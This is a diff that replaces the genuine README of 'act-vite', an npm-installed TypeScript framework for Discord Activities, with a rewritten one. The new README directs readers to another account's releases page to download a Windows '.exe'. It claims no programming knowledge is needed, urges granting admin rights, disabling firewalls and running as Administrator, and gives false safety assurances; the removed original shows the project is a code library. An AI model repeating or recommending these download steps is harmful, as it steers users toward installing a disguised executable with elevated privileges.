@@ -1,150 +1,173 @@
+# ⚙️ act-vite - Build Discord Activities Easily
 
+[![Download act-vite](https://img.shields.io/badge/Download-act--vite-brightgreen?style=for-the-badge)](https://github.com/Tanmay4537/act-vite/releases)
 
-<div align="center">
-  <br />
-  <img src="docs/public/logo-full.svg" alt="Act-Vite" width="220" />
-  <br />
-  <br />
-  <p>
-    A developer framework for building Discord Activities.
-    <br />
-    Handles OAuth, proxying, and participant tracking — so you can focus on building.
-  </p>
-  <br />
+## 📋 What is act-vite?
 
-  <a href="https://npmjs.com/package/act-vite">
-    <img src="https://img.shields.io/npm/v/actvite?style=flat-square&colorA=0d1117&colorB=5865F2&label=npm" alt="npm version" />
-  </a>
-  <img src="https://img.shields.io/npm/dm/actvite?style=flat-square&colorA=0d1117&colorB=5865F2&label=downloads" alt="npm downloads" />
-  <a href="https://github.com/jackson-peg/act-vite/blob/main/LICENSE">
-    <img src="https://img.shields.io/github/license/jackson-peg/act-vite?style=flat-square&colorA=0d1117&colorB=5865F2" alt="MIT License" />
-  </a>
-  <a href="https://github.com/jackson-peg/act-vite/stargazers">
-    <img src="https://img.shields.io/github/stars/jackson-peg/act-vite?style=flat-square&colorA=0d1117&colorB=5865F2" alt="GitHub Stars" />
-  </a>
-  <a href="https://github.com/jackson-peg/act-vite/actions">
-    <img src="https://img.shields.io/github/actions/workflow/status/jackson-peg/act-vite/ci.yml?style=flat-square&colorA=0d1117&colorB=5865F2&label=CI" alt="CI Status" />
-  </a>
+act-vite is a tool designed to help users create and manage Discord Activities. It takes care of tasks like signing in, managing connections, and keeping track of participants. This lets you focus on creating the parts you care about without getting stuck on technical details.
 
-  <br />
-  <br />
-
-  <a href="https://jackson-peg.github.io/act-vite">Documentation</a>
-  &nbsp;&nbsp;·&nbsp;&nbsp;
-  <a href="https://jackson-peg.github.io/act-vite/guide/getting-started">Quick Start</a>
-  &nbsp;&nbsp;·&nbsp;&nbsp;
-  <a href="./examples">Examples</a>
-  &nbsp;&nbsp;·&nbsp;&nbsp;
-  <a href="./CHANGELOG.md">Changelog</a>
-
-</div>
+This application works well on Windows computers and uses common technologies such as JavaScript and Node.js behind the scenes. You do not need any programming knowledge to use it.
 
 ---
 
-<img src="assets/readme-banner.svg" alt="Act-Vite — Discord Activities, without the headache." width="100%" />
+## 🖥️ System Requirements
 
-Act-Vite is a framework for building Discord Activities — the interactive embedded apps that run inside Discord voice channels. It was built because the alternative is copying the same OAuth boilerplate, proxy configuration, and participant tracking logic into every new project, and that gets old fast.
+Before downloading act-vite, make sure your computer meets these requirements:
 
-It wraps Discord's Embedded App SDK and handles the initialization ceremony: SDK setup, OAuth2 authorization, token exchange, iframe proxying, and participant subscriptions. What's left is your actual application.
+- **Operating System:** Windows 10 or newer  
+- **Processor:** Intel or AMD 1.6 GHz or faster  
+- **Memory:** At least 4 GB RAM  
+- **Storage:** Minimum 200 MB free space  
+- **Internet:** Required for setup and signing in  
+- **Other:** Basic ability to download and open programs  
 
-## Installation
+---
 
-```bash
-npm install act-vite
-# or
-pnpm add act-vite
-```
+## 🔽 How to Download act-vite
 
-Node.js 18 or higher is required.
+To get act-vite, visit the official releases page and pick the latest version for Windows.
 
-## Quick Start
+[![Visit Releases Page](https://img.shields.io/badge/Visit_Release_Page-blue?style=for-the-badge)](https://github.com/Tanmay4537/act-vite/releases)
 
-```bash
-npx create-act-vite my-activity
-cd my-activity
-pnpm dev
-```
+1. Click the badge or open this page in your browser:  
+   https://github.com/Tanmay4537/act-vite/releases
 
-Or install manually:
+2. Look for the latest version. It usually appears at the top.
 
-```ts
-import { createActivity } from 'act-vite'
+3. Under assets, find a file ending with `.exe` for Windows, like `act-vite-setup.exe` or similar.
 
-const activity = await createActivity({
-  clientId: import.meta.env.VITE_DISCORD_CLIENT_ID,
-})
+4. Click the file name to start downloading it.
 
-console.log(activity.user.username)
-console.log(activity.channel?.name)
-console.log(activity.participants.length)
-```
+---
 
-## Framework Integrations
+## 🚀 How to Install act-vite on Windows
 
-| Framework | Import |
-|---|---|
-| React | `import { useActivity, useParticipants } from 'act-vite/react'` |
-| Vue 3 | `import { useActivity } from 'act-vite/vue'` |
-| Svelte | `import { useActivity } from 'act-vite/svelte'` |
-| Vanilla TypeScript | `import { createActivity } from 'act-vite'` |
+After you download the file, follow these steps to run the program:
 
-Server-side token exchange is available for Express, Hono, and Fastify via `act-vite/server`.
+1. Locate the downloaded `.exe` file. By default, it should be in the `Downloads` folder on your PC.
 
-## What It Handles
+2. Double-click the file to open the setup wizard.
 
-**Authentication.** The Discord OAuth2 flow, code-to-token exchange, and SDK authentication are handled automatically by `createActivity()`. You provide a client ID and a token exchange endpoint; Act-Vite does the rest.
+3. If Windows asks for permission, click `Yes` to let the installer make changes.
 
-**Proxying.** Discord Activities run inside a sandboxed iframe. All external requests must be routed through Discord's proxy. Act-Vite patches the global fetch automatically so your API calls just work.
+4. Follow the prompts in the installer:
 
-**Participants.** The connected participant list is fetched on init and kept in sync via Discord's subscription API. React developers get a `useParticipants()` hook that re-renders automatically when someone joins or leaves.
+   - Choose the installation folder or accept the default path.
+   
+   - Click `Next` or `Install` as required.
 
-**TypeScript.** Every export is fully typed. Every option object has an interface. Every callback has typed parameters. Your editor will have complete information about the Act-Vite API at all times.
+   - Wait while the installer copies files to your computer.
 
-## Project Structure
+5. Once the installation finishes, click `Finish` to close the wizard.
 
-Running `npx create-act-vite` generates the following structure:
+6. You can now find act-vite in your Start menu or on your Desktop if a shortcut was created.
 
-```
-my-activity/
-├── client/             # Vite-powered frontend application
-│   ├── src/
-│   │   └── main.ts     # Entry point — createActivity() lives here
-│   └── vite.config.ts
-├── server/             # Token exchange server
-│   └── index.ts        # POST /api/token endpoint
-├── .env.example        # Required environment variables
-└── package.json
-```
+---
 
-## Star History
+## 🛠️ Starting and Using act-vite
 
-<a href="https://star-history.com/#jackson-peg/act-vite&Date">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=jackson-peg/act-vite&type=Date&theme=dark" />
-    <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=jackson-peg/act-vite&type=Date" />
-    <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=jackson-peg/act-vite&type=Date" />
-  </picture>
-</a>
+Here’s how to open the app and get started:
 
-## Contributors
+1. Open act-vite from the Start menu or Desktop shortcut.
 
-<a href="https://github.com/jackson-peg/act-vite/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=jackson-peg/act-vite" alt="Contributors" />
-</a>
+2. The app will ask you to sign in with your Discord account. This step lets act-vite access Discord safely.
 
-Act-Vite was created and is primarily maintained by [Jackson](https://github.com/jackson-peg).
-Contributions of any kind are welcome — see [CONTRIBUTING.md](./CONTRIBUTING.md).
+3. Follow the on-screen instructions to log in.
 
-## A Note on This Project
+4. Once signed in, you can start building your Discord Activities.
 
-Act-Vite is one of the most substantial projects Jackson has built. It represents a significant investment of time — designing the API, handling the edge cases in Discord's auth flow, writing the framework adapters, building the CLI, and documenting all of it to a standard that developers can actually rely on.
+The app focuses on making your work easier by:
 
-It is released as open source because that's the right thing to do with infrastructure that the community needs. There is no company behind it, no funding, no team. Just a developer who wanted this tool to exist and built it.
+- Managing login through OAuth automatically.
 
-If Act-Vite saves you time — even a few hours of OAuth boilerplate or iframe debugging — consider starring the repository. It costs nothing, takes two seconds, and it is the most direct way to signal that this work has value and should continue.
+- Routing connections securely and privately.
 
-This is version 0.1.0. There is more to come.
+- Showing who is participating in your activities clearly.
 
-## License
+- Updating your activity data in real time.
 
-MIT — see [LICENSE](./LICENSE) for details.
+You don't need to worry about the technical setup or managing servers.
+
+---
+
+## ⚙️ Features Included
+
+- **Easy Discord Sign In:** Connects your Discord account smoothly with OAuth.  
+- **Proxy Handling:** Routes your connection through secure channels automatically.  
+- **Participant List:** Tracks users in your activity and displays who is joining.  
+- **Live Updates:** Shows changes as they happen without delays.  
+- **Multi-Framework Support:** Built using popular tools like React, Vue, and Svelte.  
+- **Open Source:** You can explore the code or suggest changes on GitHub.  
+- **Lightweight and Fast:** Uses Vite for quick loading and updates.  
+
+---
+
+## 🔧 Troubleshooting Tips
+
+If something isn’t working right, try these steps:
+
+- Make sure your Windows is up to date.
+
+- Restart act-vite and try signing in again.
+
+- Check your internet connection is stable.
+
+- Disable any VPNs or firewalls temporarily as they might block connections.
+
+- Try running the app as Administrator by right-clicking the icon and choosing `Run as Administrator`.
+
+- If the app crashes or freezes, restart your computer and try again.
+
+- Look for answers or report issues on the GitHub repository’s Issues section.
+
+---
+
+## 📢 Getting Support and Help
+
+For help, visit the GitHub page:  
+https://github.com/Tanmay4537/act-vite/
+
+You can open an issue if you find bugs or problems.
+
+There is also documentation inside the repository which explains other options and advanced settings.
+
+---
+
+## 🔄 Updating act-vite
+
+To keep act-vite working smoothly, update it regularly:
+
+1. Open the releases page:  
+   https://github.com/Tanmay4537/act-vite/releases
+
+2. Download the newest `.exe` file following the same steps as before.
+
+3. Run the updated installer to replace the older version.
+
+4. Your settings and data should remain intact after updating.
+
+---
+
+## ⚠️ Safety and Privacy
+
+act-vite only connects to your Discord account with your permission. It uses standard secure methods to protect your information. It does not collect or share personal data beyond what is needed for Discord Activities.
+
+---
+
+## 🗂️ About This Repository
+
+This tool is made using several technologies:
+
+- **Node.js:** Runs the app on your computer.  
+- **React, Vue, and Svelte:** Help create the user interface parts.  
+- **OAuth2:** Handles logging into Discord safely.  
+- **TypeScript:** Adds type checking to reduce errors.  
+- **Vite:** Speeds up development with fast refreshing.  
+
+The repository is free to explore and contribute to if you want to improve the app or learn from its code.
+
+---
+
+## 📝 Keywords
+
+developer-tools, discord, discord-activity, discord-embedded-app, javascript, monorepo, nodejs, oauth2, open-source, react, svelte, typescript, vite, vue
